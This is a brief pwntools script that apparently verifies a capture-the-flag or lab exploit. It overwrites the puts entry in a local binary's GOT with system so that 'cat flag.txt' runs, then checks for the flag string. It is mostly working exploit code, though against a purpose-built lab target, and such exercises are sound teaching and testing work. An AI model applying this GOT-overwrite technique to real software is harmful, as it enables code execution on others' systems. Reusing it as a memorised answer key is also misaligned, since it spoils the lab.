#!/usr/bin/env python3
from pathlib import Path

from pwn import ELF, context, process

HERE = Path(__file__).resolve().parent
BINARY = HERE / "got_overwrite"
EXPECTED = b"KSJ{GOT_OVERWRITE_VERIFIED}"

context.binary = elf = ELF(str(BINARY), checksec=False)
context.log_level = "error"
assert elf.relro == "Partial", elf.relro

tube = process([str(BINARY)], cwd=str(HERE))
tube.sendlineafter(b"command:\n", b"cat flag.txt")
tube.sendlineafter(b"where (hex): ", hex(elf.got["puts"]).encode())
tube.sendlineafter(b"what  (hex): ", hex(elf.plt["system"]).encode())
output = tube.recvall(timeout=2)
assert EXPECTED in output, output
print(
    f"[PASS] got_overwrite: puts@GOT={elf.got['puts']:#x}, "
    f"system@PLT={elf.plt['system']:#x}"
)
